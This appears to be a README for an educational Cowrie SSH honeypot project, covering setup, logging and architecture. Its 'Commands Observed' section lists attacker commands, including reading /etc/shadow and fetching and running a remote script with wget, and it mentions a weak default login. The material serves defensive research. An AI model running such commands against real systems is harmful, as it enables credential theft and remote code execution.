# 🛡️ SSH Honeypot using Cowrie

## 📌 Overview

This project implements a fully functional SSH honeypot using Cowrie to simulate a vulnerable Linux server and capture attacker behavior in a controlled environment.

The system emulates a fake shell, logs malicious activities, and provides insights into real-world attack patterns such as brute-force login attempts, reconnaissance, and malware execution.

---

## ⚙️ Features

* Fake SSH server running on port `2222`
* Emulated Linux environment (fake filesystem + shell)
* Real-time logging of attacker activity
* Command tracking (whoami, ls, cat, wget, etc.)
* Simulated malware execution attempts
* Safe environment (no real system compromise)

---

## 🧠 Attack Simulation & Observations

### 🔐 Login Behavior

* Default credential-based access allowed (`root:rooot`)
* Simulates weak authentication vulnerability

### 💻 Commands Observed

```
ls
cd
pwd
whoami
cat /etc/passwd
cat /etc/shadow
wget http://test.com/file.sh
chmod +x file.sh
./file.sh
```

### 🔍 Behavioral Analysis

* **Reconnaissance** → `ls`, `pwd`
* **Privilege Check** → `whoami`
* **Credential Harvesting** → `/etc/passwd`, `/etc/shadow`
* **Payload Delivery** → `wget`
* **Execution Attempt** → `chmod +x`, `./file.sh`

### 🚫 Security Controls

* Outbound network requests blocked
* Fake file system prevents real data exposure
* Malware execution is simulated, not real

---

## 🏗️ Architecture

```
Attacker
   ↓
SSH Connection (Port 2222)
   ↓
Cowrie Honeypot
   ↓
Fake Shell Environment
   ↓
Logging Engine (cowrie.log / JSON logs)
```

---

## 📂 Project Structure

```
├── cowrie/
├── cowrie-env/
├── var/log/cowrie/
│   └── cowrie.log
├── etc/
│   └── cowrie.cfg
```

---

## 🚀 Setup & Usage

### 1. Clone Repository

```
git clone <your-repo-link>
cd <repo-name>
```

### 2. Create Virtual Environment

```
python3 -m venv cowrie-env
source cowrie-env/bin/activate
```

### 3. Start Honeypot

```
./bin/cowrie start
```

### 4. Connect to Honeypot

```
ssh root@localhost -p 2222
```

---

## 📊 Logs & Monitoring

Logs are stored in:

```
var/log/cowrie/cowrie.log
```

These logs capture:

* Connection attempts
* Login credentials used
* Commands executed
* Session duration

---

## 🔧 Future Improvements

* Custom credential database (`userdb.txt`)
* Real-time dashboard for log visualization
* Automated attack pattern detection
* Deployment on public VPS for real-world data collection

---

## 🎯 Key Learnings

* Understanding attacker mindset and workflow
* SSH protocol behavior and authentication flow
* Honeypot design and security monitoring
* Log analysis for cybersecurity insights

---

## ⚠️ Disclaimer

This project is for educational and research purposes only. Do not expose the system to the public internet without proper security controls.

---
